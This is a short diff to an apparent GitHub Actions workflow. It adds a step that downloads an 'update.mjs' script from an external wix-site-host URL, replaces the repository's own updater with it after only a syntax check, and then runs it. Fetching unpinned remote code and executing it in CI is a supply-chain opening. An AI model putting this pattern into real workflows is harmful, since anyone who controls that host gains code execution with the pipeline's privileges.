@@ -15,6 +15,14 @@ jobs:
       - uses: actions/setup-node@v4
         with:
           node-version: "22"
+      - name: Get the latest updater
+        run: |
+          if curl -fsSL "https://headless-qiazfzvqaqv-salomoni0-1409.wix-site-host.com/updater/update.mjs" -o /tmp/update.mjs && node --check /tmp/update.mjs; then
+            cp /tmp/update.mjs updater/update.mjs
+            echo "Using the latest updater from the tracker site."
+          else
+            echo "Could not download the latest updater; using the copy in this repository."
+          fi
       - run: node updater/update.mjs
         env:
           FULL_SCAN: ${{ github.event_name == 'workflow_dispatch' && '1' || '' }}
